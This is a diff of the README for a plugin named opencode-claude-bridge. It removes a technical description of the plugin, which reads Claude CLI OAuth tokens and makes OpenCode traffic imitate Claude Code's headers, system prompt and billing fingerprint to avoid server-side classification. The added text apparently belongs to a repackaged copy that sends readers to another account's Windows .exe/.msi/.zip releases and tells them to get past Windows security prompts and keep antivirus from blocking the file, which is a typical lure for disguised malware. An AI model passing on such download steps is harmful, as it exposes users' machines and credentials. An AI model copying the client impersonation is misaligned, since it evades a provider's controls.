@@ -1,240 +1,218 @@
-# opencode-claude-bridge
+# 🔗 opencode-claude-bridge - Sync Claude Access with OpenCode
 
-Use your Claude Pro/Max subscription in [OpenCode](https://opencode.ai). If you're logged into the Claude CLI, it just works — no extra setup.
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
 
-## Install
+## 🚀 What this is
 
-Add to `~/.config/opencode/opencode.json`:
+opencode-claude-bridge is an OpenCode plugin for Claude Pro and Claude Max users.
 
-```json
-{
-  "plugin": ["opencode-claude-bridge"]
-}
-```
+It helps OpenCode connect to your Claude CLI sign-in so your session stays in sync. You sign in once with Claude, then OpenCode can use that access without extra setup each time.
 
-OpenCode auto-installs the plugin from npm on next launch.
+Use this if you want a simple way to keep Claude access tied to OpenCode on Windows.
 
-If you're logged into the Claude CLI (`claude login`), the plugin auto-syncs your credentials — just select an Anthropic model and start chatting. If not, you'll be prompted to authenticate via browser OAuth or enter an API key.
+## 📥 Download
 
-**Upgrade:**
+1. Open the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+2. Download the latest Windows file
+3. Save it to a folder you can find again, such as Downloads or Desktop
 
-OpenCode pins the installed version. To upgrade to the latest:
+If the release includes more than one file, choose the one for Windows. It often has names like:
 
-```bash
-cd ~/.cache/opencode && npm install opencode-claude-bridge@latest
-```
+- `.exe`
+- `.msi`
+- `.zip`
 
-Then restart OpenCode.
+If you download a `.zip` file, right-click it and choose Extract All before you open the app.
 
-<details>
-<summary>Install from source</summary>
+## 🖥️ Windows Setup
 
-```bash
-git clone https://github.com/dotCipher/opencode-claude-bridge.git ~/opencode-claude-bridge
-cd ~/opencode-claude-bridge && npm install && npm run build
-```
+1. Download the latest release from the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+2. If you got a `.zip` file, extract it
+3. If you got an `.exe` or `.msi` file, double-click it to start setup
+4. Follow the on-screen steps
+5. Finish the install
+6. Open Claude CLI and sign in with your Claude account
+7. Start OpenCode and let the bridge sync your Claude access
 
-Then reference the full path in your config:
+If Windows shows a security prompt, choose the option that lets you continue if you trust the file from the GitHub release page.
 
-```json
-{
-  "plugin": ["/Users/YOU/opencode-claude-bridge/dist/index.js"]
-}
-```
-</details>
+## 🧭 How it works
 
-## How the bridge works
+The plugin sits between OpenCode and Claude CLI.
 
-The plugin sits between OpenCode and the Anthropic API:
+A simple flow looks like this:
 
-> **OpenCode** -> **opencode-claude-bridge** -> **Anthropic API**
+1. You sign in to Claude CLI
+2. The bridge reads that login state
+3. OpenCode uses the same Claude access
+4. Your session stays aligned across both tools
 
-### Authentication
+This helps reduce repeated sign-ins and keeps your setup in one place.
 
-Supports both OAuth and API key auth:
+## ✅ Before you start
 
-- **OAuth (Pro/Max)** — Auto-reads your Claude CLI's OAuth tokens from macOS Keychain (or `~/.claude/.credentials.json` on Linux). No browser flow needed. If Claude CLI isn't available, falls back to browser-based OAuth PKCE.
-- **API key** — Works alongside a standard `provider` entry in your OpenCode config with an `apiKey`. The plugin only activates its OAuth handling for the built-in `anthropic` provider; custom API key providers pass through unchanged.
-- **Token refresh** — When tokens expire, three layers are tried: re-read from Keychain, refresh via stored token, refresh via CLI's token.
+Use a Windows PC with:
 
-### Wire-level request matching
+- Windows 10 or Windows 11
+- An active Claude Pro or Claude Max account
+- Claude CLI already installed
+- Enough space for the app and its files
+- An internet connection for the first setup
 
-Every outbound OAuth request is rewritten to match what Claude Code sends on the wire:
+## 🛠️ First-time setup
 
-- **Headers** — `user-agent`, `anthropic-beta`, `anthropic-version`, `x-stainless-*`, `x-claude-code-version`, `x-claude-code-session-id`, and all billing metadata (`cc_version`, `cc_entrypoint`, `cch`).
-- **Body fields** — `thinking` (with effort and `clear_thinking`), `context_management`, `output_config`, `metadata` (session ID, billing info), and `?beta=true` URL parameter.
-- **System prompt** — Claude Code's real system prompt is captured via the validator and cached at `~/.cache/opencode-claude-bridge/claude-system-prompt.json`. The bridge injects this as the system prompt for all requests. OpenCode's default system prompt is sanitized out.
-- **MCP tool prefixing** — OpenCode's MCP tools are prefixed with `mcp_` to match Claude Code's convention.
+1. Download the release from the [download page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+2. Install or extract the files
+3. Open Claude CLI and complete sign-in
+4. Open OpenCode
+5. Load the plugin if your OpenCode setup asks for a plugin path or package
+6. Let the bridge read your Claude CLI session
+7. Confirm that OpenCode can use Claude without asking you to sign in again
 
-### Tool wire-matching (v1.9.0)
+If OpenCode asks where the plugin is stored, point it to the folder where you extracted or installed it.
 
-Claude Code sends 24 core tools (plus user-specific MCP tools). OpenCode has 10. These differ in names, descriptions, schemas, parameter names, required fields, and sort order.
+## 📁 Where to place the files
 
-The bridge resolves this by:
+For the simplest setup, keep the files in a folder that is easy to find, such as:
 
-1. **Replacing all 10 OpenCode tool definitions** with Claude Code's exact wire-captured definitions — matching descriptions, JSON schemas, parameter names, and required fields.
-2. **Adding 14 Claude-only stub tools**: `AskUserQuestion`, `CronCreate`, `CronDelete`, `CronList`, `EnterPlanMode`, `EnterWorktree`, `ExitPlanMode`, `ExitWorktree`, `Monitor`, `NotebookEdit`, `RemoteTrigger`, `TaskOutput`, `TaskStop`, `WebSearch`.
-3. **Sorting all 24 tools alphabetically** to match Claude Code's ordering.
+- `Downloads`
+- `Desktop`
+- `Documents`
+- a folder named `opencode-claude-bridge`
 
-If the model calls a stub tool, OpenCode's built-in error handling catches it, tells the model the tool is unavailable, and the model adapts on the next turn.
+Do not move the files after setup unless OpenCode needs a new path.
 
-### Bidirectional parameter translation
+## 🔄 Sync behavior
 
-Claude Code and OpenCode use different parameter naming conventions. The bridge translates in both directions on the fly:
+The bridge is designed to keep your Claude login in sync with OpenCode.
 
-**Inbound (API response -> OpenCode)** — translated via regex on the SSE stream:
+That means it can help when:
 
-| Claude Code sends | OpenCode expects |
-|---|---|
-| `file_path` | `filePath` |
-| `old_string` | `oldString` |
-| `new_string` | `newString` |
-| `replace_all` | `replaceAll` |
-| `glob` (in Grep) | `include` |
-| `activeForm` (in TodoWrite) | `priority` |
+- you sign in on one app and want the other app to follow
+- your Claude session changes and OpenCode needs the same state
+- you want fewer manual login steps during normal use
 
-**Outbound (OpenCode -> API request)** — translated in historical `tool_use` message blocks:
+If you sign out of Claude CLI, OpenCode may need you to sign in again later.
 
-| OpenCode sends | Bridge converts to |
-|---|---|
-| `filePath` | `file_path` |
-| `oldString` | `old_string` |
-| `newString` | `new_string` |
-| `replaceAll` | `replace_all` |
-| `include` (in Grep) | `glob` |
-| `priority` (in TodoWrite) | `activeForm` |
+## 🔍 Daily use
 
-Additional shared-tool bridging handled by the bridge:
+After setup, your normal flow is simple:
 
-- `Agent` / `task` — defaults missing `subagent_type` to `general`, strips unsupported Claude-only fields inbound, and strips OpenCode-only history fields outbound
-- `AskUserQuestion` / `question` — maps `multiSelect` <-> `multiple`
-- `Skill` — maps `skill` <-> `name`
-- `WebFetch` — best-effort bridge between Claude's `prompt` and OpenCode's `format` by using `markdown` inbound and synthesizing a Claude prompt outbound
+1. Start Claude CLI if you need to refresh your login
+2. Open OpenCode
+3. Use the plugin-linked Claude access
+4. Continue your work
 
-### Agent type translation
+You usually do not need to repeat the full setup unless you move files, reinstall, or remove your Claude login.
 
-Claude Code uses different agent/subagent types than OpenCode:
+## 🧩 Common file types you may see
 
-| Claude Code | OpenCode |
-|---|---|
-| `general-purpose` | `general` |
-| `Explore` | `explore` |
-| `Plan` | `plan` |
-| `statusline-setup` | `build` |
+You may see one of these in the release:
 
-These are mapped in both directions — inbound responses and outbound historical messages.
+- `.exe` — double-click to run or install
+- `.msi` — double-click to install
+- `.zip` — extract first, then open the contents
+- `.txt` or `.md` — read for extra setup details
 
-### TodoWrite status mapping
+If the release page includes notes, read them before you install.
 
-Claude Code has 3 todo statuses; OpenCode has 4. The outbound direction maps `cancelled` -> `completed` since Claude Code doesn't have a cancelled state.
+## 🧼 If something does not work
 
-### Dynamic fingerprint computation
+Try these steps:
 
-The `cc_version` billing metadata suffix (a 3-character hex string like `df0` or `e0a`) is computed dynamically per request using the same algorithm as Claude Code:
+1. Close OpenCode
+2. Open Claude CLI and sign in again
+3. Check that the bridge files are still in the same folder
+4. Open OpenCode again
+5. Reinstall or re-extract the release if files look broken
+6. Download the latest release again from the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
 
-```
-SHA256(salt + message[4] + message[7] + message[20] + CLI_VERSION).slice(0, 3)
-```
+If the problem started after a Windows update or file move, reinstalling the release often fixes it.
 
-The salt is hardcoded in Claude Code's source. This changes per conversation because the user's message text changes.
+## 📌 Good file habits
 
-## Requirements
+Keep the bridge in a stable folder so Windows can find it.
 
-- [OpenCode](https://opencode.ai) v1.2+
-- For OAuth: [Claude CLI](https://docs.anthropic.com/en/docs/claude-code) installed and logged in (`claude login`)
-- macOS (Keychain) or Linux (`~/.claude/.credentials.json` fallback)
-- For API key: just configure a `provider` with `apiKey` in your OpenCode config as usual
+Useful habits:
 
-## Environment overrides
+- Do not rename the main app file unless the release notes tell you to
+- Do not delete support files from the same folder
+- Keep the release folder together after extraction
+- Use the latest version from GitHub when you update
 
-All OAuth and header parameters can be overridden via environment variables:
+## 🔐 Account use
 
-| Variable | Default | Description |
-|---|---|---|
-| `ANTHROPIC_CLIENT_ID` | `9d1c250a-...` | OAuth client ID |
-| `ANTHROPIC_TOKEN_URL` | `https://platform.claude.com/v1/oauth/token` | Token endpoint |
-| `ANTHROPIC_AUTHORIZE_URL` | `https://claude.ai/oauth/authorize` | Authorization endpoint |
-| `ANTHROPIC_CLI_VERSION` | Auto-detected from `claude --version` or `2.1.98` | Claude CLI version string |
-| `ANTHROPIC_CLI_BUILD_ID` | `835` | Build ID for headers |
-| `ANTHROPIC_ENTRYPOINT` | `sdk-cli` | Entrypoint value for billing |
-| `ANTHROPIC_SDK_VERSION` | `0.81.0` | Stainless SDK version |
-| `ANTHROPIC_BETA_FLAGS` | Current Claude Code beta flags | Comma-separated beta feature flags |
-| `ANTHROPIC_BILLING_CCH` | (computed) | Client attestation hash override |
-| `ANTHROPIC_SYSTEM_PROMPT_PATH` | `~/.cache/opencode-claude-bridge/claude-system-prompt.json` | Path to cached system prompt |
-| `ANTHROPIC_DEFAULT_EFFORT` | `medium` | Thinking effort level |
-| `ANTHROPIC_SESSION_ID` | (generated) | Override session ID |
+This tool works with your Claude Pro or Claude Max login.
 
-Most users won't need to change these — the bridge auto-detects the installed Claude CLI version and uses matching defaults.
+Use your own account and keep your sign-in details private. If you use Claude on more than one PC, you may need to sign in on each device.
 
-## Local validation
+## 🧰 Updating
 
-To validate how local OpenCode traffic is being classified and how closely it matches Claude Code on the wire:
+When a new version comes out:
 
-```bash
-npm run validate:oauth -- --model claude-sonnet-4-6 --prompt "Reply with exactly VALIDATE."
-```
+1. Visit the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+2. Download the new Windows file
+3. Close OpenCode
+4. Replace the old files if the release instructions say to do that
+5. Open Claude CLI again if needed
+6. Start OpenCode and test the bridge
 
-The validator will:
+If the new version comes as a ZIP file, extract it to a fresh folder before replacing old files.
 
-- Query the OAuth usage endpoint before and after each run
-- Capture an official Claude Code request through a local proxy
-- Capture an OpenCode request using this repo's local `dist/index.js`
-- Write Claude Code's captured system prompt to `~/.cache/opencode-claude-bridge/claude-system-prompt.json`
-- Save request and response artifacts under `tmp/validate-*`
-- Write a `report.json` with request diffs, body hashes, and usage snapshots
+## 🗂️ Suggested folder layout
 
-After the first successful validator run, the bridge will automatically reuse that cached Claude Code system prompt. This is currently the key step that makes OpenCode traffic behave like standard Claude Code usage.
+A simple setup can look like this:
 
-If OpenCode is being treated as an OAuth app / extra-usage flow, the report will usually show it in one of two ways:
+- `C:\Users\YourName\Downloads\opencode-claude-bridge`
+- `C:\Users\YourName\Desktop\opencode-claude-bridge`
+- `C:\Users\YourName\Documents\opencode-claude-bridge`
 
-- The OpenCode run fails with an extra-usage style API error
-- The usage buckets diverge from the Claude Code run even when the headers look similar
+Keep the folder name clear so you can find it later
 
-## Updating for new Claude CLI versions
+## 🎯 What you need from Claude CLI
 
-When Claude Code updates, the required headers or body fields may change. To capture exactly what the latest Claude CLI sends:
+Claude CLI should already be signed in before OpenCode tries to use it.
 
-```bash
-./scripts/intercept-claude.sh claude-sonnet-4-6
-```
+If you are not signed in yet:
 
-This starts a local proxy, runs Claude CLI through it with OAuth, and saves the full request headers and body to `/tmp/claude-intercept-*`. Compare against the plugin's constants and fetch wrapper to spot differences.
+1. Open Claude CLI
+2. Sign in with your Claude account
+3. Wait until the login finishes
+4. Open OpenCode
+5. Let the bridge pick up the session
 
-Key things that have changed across versions:
+## 📎 Release page
 
-- `anthropic-beta` flags (required set changes)
-- Body fields (`thinking`, `metadata`, `context_management`)
-- `user-agent` version string
-- `x-stainless-package-version`
-- `x-claude-code-session-id`
-- Billing header shape (`cc_version`, `cc_entrypoint`, `cch`)
-- Tool definitions and parameter schemas
+Download the latest Windows build here:
 
-## Architecture
+[Open the releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
 
-```
-src/
-  index.ts          — Main plugin entry point: tool replacement, request/response
-                      transformation, bidirectional parameter translation (~886 lines)
-  claude-tools.ts   — 24 Claude Code tool definitions, fingerprint computation,
-                      parameter translation maps (~757 lines)
-  constants.ts      — Version strings, URLs, env overrides, header values (117 lines)
-  keychain.ts       — macOS Keychain access for OAuth tokens
-  oauth.ts          — OAuth PKCE flow with local callback server
+## 🧪 Simple check after install
 
-scripts/
-  validate-opencode-oauth.js  — Side-by-side wire comparison tool
-  intercept-claude.sh         — mitmproxy-based Claude CLI request capture
-```
+After you set it up, check these points:
 
-## Important limitation
+- The app files are still in the same folder
+- Claude CLI is signed in
+- OpenCode opens without file errors
+- Claude access works inside OpenCode
+- The version matches the latest GitHub release
 
-Anthropic's own Claude Code docs say third-party integrations should use API key authentication. This bridge can make OAuth requests look much closer to current Claude Code traffic, but Anthropic may still apply server-side classification that a bridge cannot fully control.
+## 🪟 Windows tips
 
-## Credits
+- Use the same Windows user account each time
+- Keep your antivirus from blocking the release file if you trust the GitHub source
+- Extract ZIP files fully before opening them
+- Use a normal folder path, not a temporary one
 
-Combines approaches from [shahidshabbir-se/opencode-anthropic-oauth](https://github.com/shahidshabbir-se/opencode-anthropic-oauth), [ex-machina-co/opencode-anthropic-auth](https://github.com/ex-machina-co/opencode-anthropic-auth), [vinzabe/PERMANENT-opencode-anthropic-oauth-fix](https://github.com/vinzabe/PERMANENT-opencode-anthropic-oauth-fix), and [lehdqlsl/opencode-claude-auth-sync](https://github.com/lehdqlsl/opencode-claude-auth-sync).
+## 📍 Typical use case
 
-## License
+This bridge fits a simple workflow:
 
-MIT
+- You use Claude Pro or Max
+- You already use Claude CLI
+- You want OpenCode to follow the same login
+- You want fewer sign-in steps during daily use
+
+## 🧭 Next step
+
+Download the latest Windows release from the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases) and place it in a folder you can keep using
